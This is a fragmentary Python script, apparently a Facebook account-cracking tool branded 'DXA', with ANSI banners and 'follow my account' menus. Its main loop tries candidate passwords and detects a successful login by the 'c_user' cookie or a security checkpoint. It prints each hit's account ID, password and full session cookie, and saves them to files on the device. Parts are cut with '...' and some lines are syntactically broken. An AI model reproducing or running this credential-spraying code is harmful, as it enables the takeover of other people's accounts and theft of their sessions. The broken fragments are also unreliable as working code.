...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m Follow My Facebook Account 
    print(' [2] EXIT')
...
def o():
    ...
    jalan('\x1b[1;32m [2] \x1b[1;32mFollow my account ')
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mDXA\33[0;m\033[1;32m && \033[1;33mDXA\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Azan X
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mDXA WORLD
...
\033[1;37m================= \33[32;45mDXA\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO DXA WORLD\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(DXA-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DXA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(DXA-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/DXA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[DXA] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
